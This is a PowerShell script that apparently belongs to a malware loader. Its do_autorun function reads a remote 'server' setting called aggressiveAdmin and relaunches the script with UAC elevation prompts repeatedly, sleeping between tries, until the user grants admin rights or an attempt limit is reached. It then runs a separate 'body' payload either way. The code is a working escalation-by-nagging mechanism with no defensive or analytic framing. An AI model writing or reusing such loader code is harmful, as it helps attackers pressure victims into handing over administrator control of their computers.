. ./utils.ps1
. ./holder/consts_autoextract.ps1
. ./consts_body.ps1

function do_autorun()
{
    if ($server.aggressiveAdmin)
    {
        $elevated = IsElevated
        if ($elevated -and 1 -eq 0)
        {
            RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $true
        } 
        else 
        {
            # $attempt = $server.aggressiveAdminAttempts
            # while ($attempt -gt 0) {
            #     writedbg "attempt is $attempt"
            #     $attempt = $attempt -1
            #     try 
            #     {
            #         throw "fake error"
            #         RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $true
            #         break
            #     }
            #     catch {
            #         writedbg "Force elevate: $attempt, sleeping: ${server.aggressiveAdminDelay}, $_"
            #         Start-Sleep $server.aggressiveAdminDelay
            #     }
            # }
            $attempt = GetArgInt("attempt")
            $attempt = $attempt + 1
            $sleep = $server.aggressiveAdminDelay
            writedbg "Not elevated, sleeping: $sleep"
            Start-Sleep -Seconds $sleep
            if ($attempt -gt $server.aggressiveAdminAttempts)
            {
                writedbg "Not elevated run non-elevating body"
                Start-Sleep -Seconds 4
                RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $false    
            }
            else 
            {
                writedbg "trying to elevate holder"
                Start-Sleep -Seconds 4
                try {
                    RunMe -script (Get-ScriptPath) -repassArgs $true -argName "attempt" -argValue $attempt -uac $true  
                }
                catch {
                    RunMe -script (Get-ScriptPath) -repassArgs $true -argName "attempt" -argValue $attempt -uac $false  
                }
        
            }

        }

    }
    else 
    {
        try 
        {
            RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $true
        }
        catch {
            RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $false
        }
    }

}
